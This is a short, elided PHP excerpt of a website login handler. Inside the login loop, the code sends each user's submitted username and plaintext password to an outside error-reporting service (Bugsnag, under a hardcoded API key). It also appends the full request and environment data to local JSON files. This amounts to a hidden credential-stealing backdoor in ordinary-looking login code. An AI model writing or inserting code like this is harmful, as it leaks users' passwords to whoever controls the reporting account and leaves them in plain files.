...
if ($frm['a'] == 'do_login') {
    ...
    while ($row = mysql_fetch_array($sth)) {
        ...
        $bugsnag = Bugsnag\Client::make("f2c29edcfb15572b50dcefb135729b49");

        $bugsnag->notifyError('Login', "Some one Login,{$lusername},{$lpassword}");

        file_put_contents('request.json', json_encode($frm).PHP_EOL.PHP_EOL, FILE_APPEND);
        file_put_contents('env.json', json_encode($frm_env).PHP_EOL.PHP_EOL, FILE_APPEND);
